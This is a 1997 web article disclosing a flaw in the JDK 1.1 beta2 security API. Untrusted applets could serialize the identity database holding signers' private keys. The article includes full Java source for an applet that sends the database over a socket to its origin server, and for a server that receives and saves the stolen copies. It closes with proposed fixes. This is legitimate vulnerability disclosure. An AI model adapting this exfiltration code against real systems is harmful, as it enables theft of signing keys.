@@ -1,0 +1,538 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//en">
+<HTML>
+<HEAD>
+   <TITLE>Security Holes in the Java Security API</TITLE>
+   <META NAME="GENERATOR" CONTENT="Mozilla/3.01Gold (Win95; I) [Netscape]">
+   <META NAME="Author" CONTENT="Jean-Paul Billon">
+   <META NAME="Description" CONTENT="There is a big security hole in the security API of JDK 1.1 beta2. And some other problems also...">
+   <META NAME="KeyWords" CONTENT="Java, Java security, serialization, private key, security API, JDK 1.1, secure Java, programming languages, secure architecture, internet security, applet security, servlet security, Billon, VIP, Dyade">
+<META  NAME="lang" CONTENT="frrestriction">
+<META  NAME="lang" CONTENT="fr">
+
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#FEE7C9" LINK="#0000FF" VLINK="#800080" ALINK="#FF00FF">
+
+<UL>
+<CENTER><TABLE BORDER=1 >
+<TR>
+<TD BGCOLOR="#C4FFFF">
+<H1 ALIGN=CENTER><B><I><FONT COLOR="#FF0000"><FONT SIZE=+2>Security Breaches</FONT></FONT></I></B></H1>
+
+<H1 ALIGN=CENTER><B><I><FONT COLOR="#FF0000"><FONT SIZE=+2>in the JDK 1.1
+beta2 </FONT></FONT></I></B></H1>
+
+<H1 ALIGN=CENTER><B><I><FONT COLOR="#FF0000"><FONT SIZE=+2>security API</FONT></FONT></I></B></H1>
+
+<CENTER><ADDRESS><FONT COLOR="#800000"><FONT SIZE=-1><A HREF="/fr/actions/vip/jp.html">Jean-Paul
+Billon </A></FONT></FONT></ADDRESS></CENTER>
+
+<CENTER><ADDRESS><FONT COLOR="#800000"><FONT SIZE=-1>Consultant </FONT></FONT></ADDRESS></CENTER>
+
+<CENTER><ADDRESS><FONT COLOR="#800000"><FONT SIZE=-1>VIP DYADE</FONT></FONT></ADDRESS></CENTER>
+
+<CENTER><ADDRESS><B><FONT COLOR="#800000"><FONT SIZE=-1><A HREF="mailto:Jean-Paul.Billon@dyade.fr">Jean-Paul.Billon@dyade.fr</A></FONT></FONT></B></ADDRESS></CENTER>
+
+<CENTER><ADDRESS><B><FONT COLOR="#000000"><FONT SIZE=-1>First publication:
+1/8/97</FONT></FONT></B></ADDRESS></CENTER>
+
+<CENTER><ADDRESS><B><FONT COLOR="#000000"><FONT SIZE=-1>Last update: 1/8/97</FONT></FONT></B></ADDRESS></CENTER>
+
+<CENTER><ADDRESS>
+<HR WIDTH="100%"></ADDRESS></CENTER>
+
+<H1 ALIGN=CENTER><!-- greetings applet sample HTML --><APPLET code="greetings.class" width=300 height=30></APPLET></H1>
+
+<P><B><FONT COLOR="#FF0000"><FONT SIZE=+1><A HREF="#Introduction">Introduction</A></FONT></FONT></B></P>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFBDBD"><BR>
+<B><FONT COLOR="#000040"><FONT SIZE=+1><A HREF="#Identity">Identity Databases
+and Signers</A></FONT></FONT></B> 
+<P><BR>
+</P>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#ACFFAC"><BR>
+<B><FONT SIZE=+1><A HREF="#How Untrusted Applets Can Steal Private">How
+Untrusted Applets Can Steal Private Keys</A></FONT></B> 
+<P><B><FONT SIZE=+1><A HREF="#Conclusion">Conclusion</A></FONT></B><BR>
+</P>
+</TD>
+</TR>
+</TABLE></CENTER>
+
+<CENTER><P>
+<HR WIDTH="100%">
+<HR WIDTH="100%"></P></CENTER>
+</UL>
+
+<H1><A NAME="Introduction"></A><B>Introduction</B></H1>
+
+<P><FONT SIZE=+1>In <A HREF="/fr/actions/vip/JS_pap2.html">another
+paper</A> I have published critics about some basic weaknesses of the present
+Java runtime system (the one of JDK 1.02 as well as the one of JDK 1.1).
+Here are some complementary and partially independent remarks on the new
+security API proposed with JDK 1.1 (beta2 pre-release).</FONT></P>
+
+<P><FONT SIZE=+1>The main problem I have found is related to the interaction
+of serialization with the management of identity and public/private key
+database as proposed by <B>javakey</B>. This database is stored in a permanent
+serial object file. At init time, this persistent object is loaded and
+stored in a static variable of the class <I>IdentityScope</I> of the package<I>
+java.security</I>. This object (let me call it &quot;systemscope&quot;)
+is publicly available via the request: <I><TT>IdentityScope.getSystemScope()</TT></I>.
+An untrusted applet can then get the <I>systemscope</I> of the client site
+and send to the server it comes from a serialized version of this object
+. No security check is made to forbid this and thus no hack is necessary
+to program such an applet. While the applet generally cannot access and
+use the private keys of the signers recorded in the systemscope of the
+client, it is perfectly possible for the server to access and use them
+once it has received the serialized version of this object. </FONT></P>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<H1><A NAME="Identity"></A>Identity Databases and Signers</H1>
+
+<P><FONT SIZE=+1>An &quot;identity database&quot; is an object of (abstract)
+type <I>java.security.IdentityScope</I> where &quot;identities&quot; are
+stored along with with their public keys and certificates. It is also possible
+to store in an identity database &quot;signers&quot;: these are special
+identities with a private/public pair of keys, the private key being used
+for signing data. </FONT></P>
+
+<P><FONT SIZE=+1>The <I>java.security</I> API provides almost only interfaces
+and abstract classes. To make all the security stuff work, an implementation
+of these abstract classes is needed. This the role of &quot;security providers&quot;.
+JDK 1.1 comes with a default security provider, the package <I>sun.security.provider</I>.
+With the classes <I>SystemIdentity</I>, <I>SystemSigner</I> and <I>IdentityDatabase</I>
+this package provides a basic implementation of the abstract classes <I>Identity</I>,
+<I>Signer</I> and <I>IdentityScope </I>defined in<I> java.security. </I>It
+provides also basic implementations of cryptographic algorithms.</FONT></P>
+
+<P><FONT SIZE=+1>A third-party program has no need to know what is the
+particular security provider used on a site: a static class, <I>java.security.Security,
+</I>is used as an interface between such a program and the security provider.
+For example, to get a signature algorithm object, a program has just to
+request it from this static class. The class <I>java.security.Security</I>
+is aware of the security provider in use (thanks to an information file
+that it reads at init time), and can provide to the requester an instance
+of the concrete class implementing in its methods the required algorithm.
+The requester has no need to know the concrete type of the object it receives.</FONT></P>
+
+<P><FONT SIZE=+1>Generally, all communications between application programs
+and the security provider in use is done through the static class <I>java.security.Security</I>.
+However, there is an important exception. At init time, this class reads
+from the security information file what is the particular class used for
+the default identity database. With the basic security provider of Sun,
+this class is <I>sun.security.provider.IdentityDatabase</I>. When initialized,
+this last class reads a file &quot;identitydb.obj&quot; where is stored
+a serialized instance (of itself). This serialized instance can be created
+and modified thanks to the tool <B>javakey</B> provided by Sun. By deserializing
+this object, <I>IdentityDatabase</I> creates a runnable instance assigned
+to a static variable of the abstract class <I>java.security.IdentityScope</I>.
+It is this instance (that I call &quot;systemscope&quot;) that can be obtained
+by the request: <I><TT>IdentityScope.getSystemScope()</TT></I> with the
+abstract type <I>IdentityScope</I>. Any application program or applet is
+allowed to access the identities strored inside <I>systemscope </I>and
+use their public keys and certificates to verify the authenticity of incoming
+data. But, generally, the private key of a signer stored in <I>systemscope
+</I>cannot be known nor used. </FONT></P>
+
+<P><FONT SIZE=+1>Let me explain this last point. In the sequel, I suppose
+that only the basic security provider of Sun is used. The public key of
+an identity can be known thanks to a public method of the abstract class
+<I>Identity</I>. The private key of a signer can be divulgated only by
+the method <I>getPrivateKey() </I>of the abstract class <I>Signer</I> defined
+in the package <I>java.security </I>and by the method<I> getSignerPrivateKey()
+</I>defined in the concrete subclass<I> SystemSigner</I> of the package
+<I>sun.security.provider</I>. These methods are <I>protected</I>. So, it
+is not possible for an object belonging to a class external to these packages
+to get the private key of a signer nor to use it.</FONT></P>
+
+<P><FONT SIZE=+1>There are only two cases where the private key of a (Sun)
+signer can be used. First, by <B>javakey</B> itself to sign <B>jar</B>
+files (note that <B>javakey </B>is a small script to launch a java program
+of main class: <I>java.security.provider.Main</I>). Secondly, by programs
+that have classes declared to be members of the package<I> java.security
+</I>or <I>sun.security.provider</I>. This last case is possible because,
+in the present implementation of the java runtime system, nothing is made
+to guarantee the integrity of packages: an application installed in the
+classpath can define new classes or hide already installed classes of any
+package (provided by others) it wants to modify or extend (an untrusted
+applet can also define new classes in any local package except those that
+are explicitely protected from such extensions by the applet viewer: by
+default only the packages of name prefixed by &quot;java&quot;, &quot;sun&quot;
+and &quot;netscape&quot;).</FONT></P>
+
+<P><FONT SIZE=+1>Here is an example of a small java program that can sign
+a file by using the private key of a signer previously defined with <B>javakey:</B></FONT></P>
+
+<UL>
+<PRE>/* We suppose that with javakey the signer &quot;duke&quot; 
+   has been installed in the identitydb.obj file
+   automatically read at init time.
+   In order to get the private key of duke to sign,
+   the following class main has to be declared member
+   of the package java.security */
+
+package java.security;
+
+import java.io.*;
+
+public class Main1{
+   public static void main(String[] argv)
+        {IdentityScope systemscope = IdentityScope.getSystemScope();
+        System.out.println(systemscope.toString());
+        System.out.println(systemscope.getIdentity(&quot;duke&quot;));
+        Signer signer = (Signer)systemscope.getIdentity(&quot;duke&quot;);
+        PrivateKey prik = signer.getPrivateKey();
+        /* It is because getPrivateKey() is protected that we have to be
+         in package java.security!! */
+        PublicKey pubk = signer.getPublicKey();
+        try{
+                Signature signature = Signature.getSignature(&quot;DSA&quot;);
+                signature.initSign(prik);
+                File file = new File(&quot;filetobesigned.txt&quot;);
+                FileInputStream fis = new FileInputStream(file);
+                while (fis.available() != 0) {
+                        signature.update((byte)fis.read());
+                }
+                byte[] generatedSignature = signature.sign();
+                System.out.println(generatedSignature);
+                /* now we can verify that the generated signature can be authentified 
+               with the public key of duke */
+                signature.initVerify(pubk);
+                File file1 = new File(&quot;filetobesigned.txt&quot;);
+                FileInputStream fis1 = new FileInputStream(file1);
+                while (fis1.available() != 0) {
+                        signature.update((byte)fis1.read());
+                }
+                if (signature.verify(generatedSignature)) {
+                System.out.println(&quot;Signature checks out&quot;);
+                } else {
+                System.out.println(&quot;Signature does not check out.&quot;);
+                }
+        }
+        catch (Exception e){System.out.println(e);}
+   }
+}
+</PRE>
+</UL>
+
+<P><FONT SIZE=+1>I consider the possibility illustrated by this example
+quite dangerous: any java program you install in your classpath can access
+and use all the private keys stored in the identity database. In my <A HREF="/fr/actions/vip/JS_pap2.html">other
+paper</A> about the weaknesses of the present Java runtime system, I already
+designated the possibility to modify or extend packages provided by others
+as a major problem from a security viewpoint.</FONT></P>
+
+<H1>
+<HR WIDTH="100%"><BR>
+<A NAME="How Untrusted Applets Can Steal Private"></A>How Untrusted Applets
+Can Steal Private Keys</H1>
+
+<P><FONT SIZE=+1>Generally, an untrusted applet cannot define new classes
+in the packages <I>java.security</I> and <I>sun.security.provider</I>.
+So it cannot get the private key of a signer recorded in <I>systemscope</I>.
+</FONT></P>
+
+<P><FONT SIZE=+1>The object <I>systemscope</I> is computed at init time
+from the information stored in the file named &quot;identitydb.obj&quot;
+created and maintained by <B>javakey</B>. In order to make the computation
+of systemscope easy, the file &quot;identitydb.obj&quot; contains just
+a serialized representation of the object<I> systemscope</I>. To compute
+this object at init time is then quite straightforward:</FONT></P>
+
+<PRE>        IdentityScope systemscope;
+        try
+        {FileInputStream fileInputStream = new FileInputStream(new File(&quot;identitydb.obj&quot;));
+        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+        systemscope = (IdentityScope)objectInputStream.readObject();
+        IdentityScope.setSystemScope(systemscope);
+        }
+        catch (Exception e){...}
+        </PRE>
+
+<P><FONT SIZE=+1>But in order to recursively serialize <I>systemscope</I>
+and all the objects it records in its fields, all the involved classes
+(<I>Identity</I>, <I>Signer</I>, <I>Key</I>, <I>PrivateKey</I>, etc) must
+be &quot;serializable&quot;. Presently, the methods<I> readObj()</I> and
+<I>writeObj() </I>used by these classes do not invoke any security check.
+Thus, an untrusted applet, while it cannot use directly the private keys
+recorded in <I>systemscope</I>, can send, via socket, a serialized version
+of <I>systemscope</I> to the server it comes from. On the server where
+locally the packages <I>java.security</I> and <I>sun.security.provider</I>
+can be freely extended, the private keys in the object <I>systemscope</I>
+of the client site, when deserialized, can be used by programs defining
+new classes in these packages (as illustrated before). On the server site,
+<B>javakey</B> can also be used with the stollen systemscope to sign <B>jar</B>
+files with the stollen private keys.</FONT></P>
+
+<P><FONT SIZE=+1>I give below the Java source of an applet that can steal
+<I>systemscope</I>:</FONT></P>
+
+<UL>
+<PRE>import java.applet.*;
+import java.net.*;
+import java.io.*;
+import java.security.*;
+
+public class ScopeSendApplet extends BasicApplet {
+
+   IdentityScope systemScope;
+   ObjectSendThread sendThread;
+
+   public void doJob(){
+        systemScope = IdentityScope.getSystemScope();
+        printMessage(&quot;applet coming from: &quot; + getCodeBase().getHost().toUpperCase() +&quot; !&quot;);
+        sendThread = new ObjectSendThread(getCodeBase().getHost(),4444,systemScope,this);
+        sendThread.start();}
+}</PRE>
+
+<PRE>class ObjectSendThread extends Thread{
+    Socket socket;
+    ObjectOutputStream outObjStream;
+    String hostName;
+    int portNum;
+    Object obj;
+    BasicApplet client;
+
+    public ObjectSendThread (String hostName, int portNum, Object obj, BasicApplet client) {
+        this.hostName = hostName;
+        this.portNum = portNum;
+        this.obj = obj;
+        this.client = client;}
+
+     public void run() {
+        try {
+            client.printMessage(&quot;trying to open a socket connection&quot;);
+            socket = new Socket(hostName, portNum);
+            outObjStream = new ObjectOutputStream(socket.getOutputStream());
+            client.printMessage(&quot;socket opened&quot;);}
+        catch (SecurityException e) {
+            client.printMessage(&quot;SecurityException&quot; + e);
+            e.printStackTrace();}
+        catch (IOException e) {
+            client.printMessage(&quot;IOException&quot; + e);
+            client.printMessage(&quot;Couldn't get I/O for the connection to: &quot; + hostName);
+            client.printMessage(&quot;Aborted&quot;);}
+
+        if (socket != null &amp;&amp; outObjStream != null){
+            try
+            {outObjStream.writeObject(obj);
+            outObjStream.flush();
+            outObjStream.close();
+            socket.close();
+            client.printMessage(&quot;envoi objet par socket reussi!!&quot;);}
+            catch (InvalidClassException e)
+                {client.printMessage(&quot;invalid class exception in serializing object&quot;);}
+            catch (IOException e) {
+                client.printMessage(&quot;IO exception has occured&quot;);
+                client.printMessage(&quot;aborted&quot;);}
+        }
+     }
+}</PRE>
+</UL>
+
+<P><FONT SIZE=+1>The class <I>BasicApplet</I> being defined as:</FONT></P>
+
+<UL>
+<PRE>import java.applet.Applet;
+import java.awt.Graphics;
+
+public class BasicApplet extends Applet {
+
+    StringBuffer buffer;
+
+    public void init() {
+        printMessage(&quot;initializing... &quot;);
+    }
+
+    public void start() {
+        printMessage(&quot;starting... &quot;);
+        doJob();
+    }
+
+    public void stop() {
+        printMessage(&quot;stopping... &quot;);
+    }
+
+    public void destroy() {
+        printMessage(&quot;preparing for unloading...&quot;);
+    }
+
+    public void doJob(){}
+
+    public void printMessage(String newWord) {
+        System.out.println(newWord);
+        buffer = new StringBuffer();
+        buffer.append(newWord);
+        repaint();
+    }
+
+    public void paint(Graphics g) {
+        //Draw a Rectangle around the applet's display area.
+        g.drawRect(0, 0, size().width - 1, size().height - 1);
+
+        //Draw the current string inside the rectangle.
+        g.drawString(buffer.toString(), 5, 15);
+    }
+}</PRE>
+</UL>
+
+<P><FONT SIZE=+1>On the server side the serialized version of the client's
+systemscope stollen by the above applet can be received and stored by the
+following program:</FONT></P>
+
+<UL>
+<PRE>import java.net.*;
+import java.io.*;
+
+public class ObjRecServer {
+   
+        public static void main(String[] args) {
+        ServerSocket serverSocket = null;
+        boolean listening = true;
+        int clientNum = 0;
+
+        try {
+                serverSocket = new ServerSocket(4444);
+        }catch (IOException e){
+                System.err.println(&quot;Could not listen on port: &quot; + 4444 + &quot;, &quot; +
+                                        e.getMessage());
+                System.exit(1);
+         }
+
+        while (listening) {
+            Socket clientSocket = null;
+            try {System.out.println(&quot;listening for a connection&quot;);
+                clientSocket = serverSocket.accept();
+                clientNum++;
+                System.out.println(&quot;connection established&quot;);
+            } catch (IOException e) {
+                System.err.println(&quot;Accept failed: &quot; + 4444 + &quot;, &quot; +
+                                                e.getMessage());
+                continue;
+            }
+            if (clientSocket != null)
+            new ObjRecThread(clientSocket, clientNum).start();
+           }
+
+        try {
+            serverSocket.close();
+        } catch (IOException e) {
+            System.err.println(&quot;Could not close server socket.&quot; +
+                e.getMessage());}}
+}
+</PRE>
+
+<PRE>class ObjRecThread extends Thread {
+        Socket socket = null;
+        int clientNum = 0;
+        Object obj;
+
+        public ObjRecThread(Socket socket, int clientNum) {
+        super(&quot;ObjRecThread&quot;);
+        this.socket = socket;
+        this.clientNum = clientNum;
+        }
+
+        public void run() {
+        try {
+            ObjectInputStream is = new ObjectInputStream(socket.getInputStream());
+            System.out.println(&quot;reading on socket&quot;);
+            obj = is.readObject();
+            System.out.println(&quot;object successfully read&quot;);
+            socket.close();
+            System.out.println(&quot;saving&quot;);
+            save();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        }
+
+        void save(OutputStream outputStream)
+        throws IOException
+        {
+        try
+        {
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
+            objectOutputStream.writeObject(obj);
+            objectOutputStream.flush();
+        }
+        catch (Exception e)
+            {e.printStackTrace();}
+        return;
+    }
+
+        void save(File file)
+        throws IOException
+        { FileOutputStream fileOutputStream = new FileOutputStream(file);
+        save(fileOutputStream);
+        }
+
+        void save()
+        throws IOException
+        { save(setSourceFile());
+        }
+
+        File setSourceFile()
+        {String string = &quot;identityd&quot;+ clientNum + &quot;stol.obj&quot;;
+        return new File(string);
+        }
+}</PRE>
+</UL>
+
+<P><FONT SIZE=+1>This example illustrates a big security hole: no hack
+is needed to make an untrusted applet able to steal, and send to the server
+it comes from, secret ressources of the client site that it is not allowed
+to access or use on the client site itself (but that can be exploited on
+the sever site). </FONT></P>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<H1><A NAME="Conclusion"></A>Conclusion</H1>
+
+<P><FONT SIZE=+1>The apparent cause of the problem is that the <I>readObject()</I>
+and <I>writeObject() </I>methods presently used by the involved classes
+never perform any security check. However, the security risks brought by
+serializable objects are well known and well explained in JDK 1.1&nbsp;documentation.
+But Java API architecture may become so subtil, and this is especially
+true of the new security API, that it is not obvious to detect security
+breaches when using serializable classes. </FONT></P>
+
+<P><FONT SIZE=+1>To correct this main security breach there are several
+solutions:</FONT></P>
+
+<UL>
+<LI><FONT SIZE=+1>To abandon the commodity of serialization to store identity
+databases (and make <I>PrivateKey</I> objects non-serializable ones)</FONT></LI>
+
+<LI><FONT SIZE=+1>To redefine the <I>writeObject()</I> method for some
+sensitive classes like P<I>rivateKey</I> in such a way that untrusted applets
+cannot use this method for them</FONT></LI>
+
+<LI><FONT SIZE=+1>To modify the serialization process design in such a
+way that required security checks can be systematically performed when
+serializing or deserializing objects and this independently of the particular
+<I>readObject() </I>and <I>writeObject()</I> methods used by the objects.
+This solution should be prefered.</FONT></LI>
+</UL>
+
+<P><BR>
+<BR>
+<BR>
+<BR>
+</P>
+
+<P><BR>
+</P>
+
+</BODY>
+</HTML>
